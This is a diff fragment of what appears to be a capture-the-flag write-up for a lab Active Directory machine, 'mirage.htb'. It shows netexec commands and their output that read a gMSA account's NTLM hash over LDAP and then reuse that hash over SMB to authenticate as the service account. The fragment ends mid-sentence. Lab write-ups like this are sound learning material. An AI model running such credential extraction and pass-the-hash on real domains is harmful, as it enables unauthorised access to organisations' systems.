@@ -737,8 +737,22 @@ Now i can auth using this TGT
 I have the ability to the gMSA password of this account
 
 ```python
-
+❯❯❯ faketime -f +7h nxc ldap dc01.mirage.htb --use-kcache --gmsa
+LDAP        dc01.mirage.htb 389    DC01             [*] None (name:DC01) (domain:MIRAGE.HTB) (signing:None) (channel binding:Never) (NTLM:False)
+LDAP        dc01.mirage.htb 389    DC01             [+] MIRAGE.HTB\javier.mmarshall from ccache 
+LDAP        dc01.mirage.htb 389    DC01             [*] Getting GMSA Passwords
+LDAP        dc01.mirage.htb 389    DC01             Account: Mirage-Service$      NTLM: 5f62e853f3876d511ff8628cb59e757c     PrincipalsAllowedToReadPassword: javier.mmarshall
 ```
+
+I can read this value using nxc
+
+```python
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u 'mirage-service$' -H '5f62e853f3876d511ff8628cb59e757c' -k
+SMB         dc01.mirage.htb 445    dc01             [*]  x64 (name:dc01) (domain:mirage.htb) (signing:True) (SMBv1:None) (NTLM:False)
+SMB         dc01.mirage.htb 445    dc01             [+] mirage.htb\mirage-service$:5f62e853f3876d511ff8628cb59e757c
+```
+
+This user us 
 
 
 
